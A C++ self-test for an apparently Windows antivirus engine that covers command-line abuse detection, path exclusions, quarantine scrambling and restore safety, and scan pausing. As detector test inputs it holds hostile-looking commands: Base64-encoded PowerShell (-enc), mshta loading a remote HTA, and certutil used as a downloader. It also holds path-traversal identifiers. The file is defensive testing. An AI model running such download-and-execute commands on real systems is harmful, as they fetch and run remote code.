// Самопроверка модулей проверки и карантина — без прав администратора,
// без образцов и без сети.
//
//   core_selftest      код возврата — число провалов
//
// Проверяется: разбор командных строк (приёмы злоупотребления системными
// программами и то, что на них похоже, но ими не является), карантин
// туда и обратно, исключения путей, пауза конвейера проверки файлов.

#include "core/CommandTarget.h"
#include "core/Quarantine.h"
#include "core/ScanConfig.h"
#include "engine/ScanPipeline.h"

#include <Windows.h>

#include <algorithm>
#include <atomic>
#include <cstdio>
#include <filesystem>
#include <fstream>
#include <string>
#include <thread>
#include <vector>

namespace fs = std::filesystem;

namespace {

int g_failed = 0;

void Check(bool ok, const char* what) {
    std::printf("  [%s] %s\n", ok ? "ok" : "FAIL", what);
    if (!ok) ++g_failed;
}

bool Has(const std::vector<std::string>& v, const char* code) {
    return std::find(v.begin(), v.end(), code) != v.end();
}

fs::path TempDir(const wchar_t* name) {
    wchar_t buf[MAX_PATH] = {};
    GetTempPathW(MAX_PATH, buf);
    fs::path dir = fs::path(buf) / name;
    std::error_code ec;
    fs::remove_all(dir, ec);
    fs::create_directories(dir, ec);
    return dir;
}

std::string ReadAll(const fs::path& p) {
    std::ifstream in(p, std::ios::binary);
    return std::string((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
}

void WriteAll(const fs::path& p, const std::string& data) {
    std::ofstream out(p, std::ios::binary | std::ios::trunc);
    out << data;
}

} // namespace

int main() {
    SetConsoleOutputCP(CP_UTF8);

    std::printf("Command lines\n");
    {
        using CommandTarget::AbuseReasons;
        Check(Has(AbuseReasons(L"powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"),
                  "cmd.encoded"),
              "-enc with a Base64 command is recognized");
        Check(Has(AbuseReasons(L"powershell -e aQBlAHgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwA="), "cmd.encoded"),
              "the shortest form -e is recognized");
        Check(Has(AbuseReasons(L"pwsh.exe /EncodedCommand ZABpAHIAIABjADoAXAB3AGkAbgBkAG8AdwBzAA=="), "cmd.encoded"),
              "the full form with a slash is recognized");
        Check(!Has(AbuseReasons(L"powershell.exe -NoProfile -File C:\\Scripts\\export.ps1 -Encoding UTF8"),
                   "cmd.encoded"),
              "-Encoding UTF8 is not taken for an encoded command");
        Check(!Has(AbuseReasons(L"powershell.exe -ExecutionPolicy Bypass -File \"C:\\Program Files\\App\\update.ps1\""),
                   "cmd.encoded"),
              "-ExecutionPolicy is not taken for an encoded command");
        Check(!Has(AbuseReasons(L"powershell -e Bypass"), "cmd.encoded"),
              "-e followed by a plain word is not an encoded command");
        Check(Has(AbuseReasons(L"mshta.exe https://example.org/a.hta"), "cmd.mshta"), "mshta with a web address");
        Check(Has(AbuseReasons(L"certutil.exe -urlcache -split -f http://example.org/a.bin a.exe"), "cmd.certutil"),
              "certutil used as a downloader");
        Check(AbuseReasons(L"\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer").empty(),
              "an ordinary command line has no findings");
    }

    std::printf("Path exclusions\n");
    {
        ScanConfig c;
        c.excludedPaths = { L"D:\\Games\\", L"C:/Work/Build" };
        Check(c.IsExcludedPath(L"D:\\Games\\Foo\\game.exe"), "a file inside an excluded folder is excluded");
        Check(c.IsExcludedPath(L"c:\\work\\build\\x.dll"), "case and slash direction do not matter");
        Check(!c.IsExcludedPath(L"D:\\GamesOld\\game.exe"), "a folder with a longer name is not excluded");
        Check(!c.IsExcludedPath(L"E:\\Games\\game.exe"), "another drive is not excluded");
    }

    std::printf("Quarantine\n");
    {
        const fs::path dir = TempDir(L"ts-selftest-quarantine");
        const fs::path file = dir / L"sample file.bin";
        // Больше одного блока копирования и не кратно ему.
        std::string content(3 * 1024 * 1024 + 123, '\0');
        for (size_t i = 0; i < content.size(); ++i) content[i] = static_cast<char>((i * 31 + 7) & 0xFF);
        WriteAll(file, content);

        Quarantine& q = Quarantine::Instance();
        const auto id = q.QuarantineFile(file.wstring(), L"SelfTest", L"LOW");
        Check(id.has_value(), "a file is moved to quarantine");
        Check(!fs::exists(file), "the original is gone after quarantine");

        bool listed = false;
        uint64_t listedSize = 0;
        for (const QuarantineItem& item : q.List()) {
            if (id && item.id == *id) { listed = true; listedSize = item.size; }
        }
        Check(listed && listedSize == content.size(), "the record is listed with the right size");

        // Содержимое в хранилище не должно совпадать с исходным: иначе
        // на него среагирует другой антивирус и файл можно запустить.
        if (id) {
            const std::string stored = ReadAll(q.Dir() / (*id + ".q"));
            Check(stored.size() == content.size() && stored != content, "the stored copy is scrambled");
        }

        Check(!q.Restore("..\\..\\evil"), "an identifier with a path in it is rejected");
        Check(!q.Restore("ZZZZ"), "an identifier that is not hexadecimal is rejected");
        Check(!q.DeletePermanently("../x"), "deletion with a bad identifier is rejected");

        // На прежнем месте уже лежит другой файл: он должен уцелеть.
        WriteAll(file, "someone else's file");
        Check(id && q.Restore(*id), "the file is restored");
        Check(ReadAll(file) == "someone else's file", "a file at the original place is not overwritten");
        const fs::path restored = q.LastRestoredPath();
        Check(restored != file && fs::exists(restored) && ReadAll(restored) == content,
              "the restored copy gets a new name and the original content");

        bool stillListed = false;
        for (const QuarantineItem& item : q.List()) stillListed = stillListed || (id && item.id == *id);
        Check(!stillListed, "the record is removed after restoring");

        std::error_code ec;
        fs::remove_all(dir, ec);
    }

    std::printf("Scan pause\n");
    {
        const fs::path dir = TempDir(L"ts-selftest-pause");
        const int total = 60;
        for (int i = 0; i < total; ++i)
            WriteAll(dir / (L"script" + std::to_wstring(i) + L".cmd"), "@echo off\r\necho hello\r\n");

        ScanPipeline::Config cfg;
        cfg.roots = FileWalker::CustomRoots({ dir.wstring() });
        cfg.analyzer.useYara = false;   // правила здесь не нужны: проверяем сам конвейер
        cfg.threads = 3;
        std::atomic<bool> paused{ true };
        cfg.pause = &paused;

        std::atomic<bool> cancel{ false };
        std::atomic<uint64_t> checked{ 0 };
        std::atomic<bool> done{ false };
        std::thread runner([&] {
            ScanPipeline::Run(cfg, cancel, nullptr,
                              [&](const ScanPipeline::Progress& p) { checked = p.checked; });
            done = true;
        });

        Sleep(700);
        Check(checked.load() == 0 && !done.load(), "nothing is checked while the scan is paused");
        paused = false;
        for (int i = 0; i < 200 && !done.load(); ++i) Sleep(50);
        Check(done.load() && checked.load() == static_cast<uint64_t>(total),
              "after resuming, every file is checked exactly once");
        if (!done.load()) cancel = true;
        runner.join();

        // Отмена на паузе не должна повиснуть.
        paused = true;
        cancel = false;
        done = false;
        std::thread second([&] {
            ScanPipeline::Run(cfg, cancel, nullptr, nullptr);
            done = true;
        });
        Sleep(300);
        cancel = true;
        for (int i = 0; i < 100 && !done.load(); ++i) Sleep(50);
        Check(done.load(), "cancelling a paused scan finishes it");
        second.join();

        std::error_code ec;
        fs::remove_all(dir, ec);
    }

    std::printf("\n%s (%d failed)\n", g_failed ? "SOME CHECKS FAILED" : "ALL CHECKS PASSED", g_failed);
    return g_failed;
}
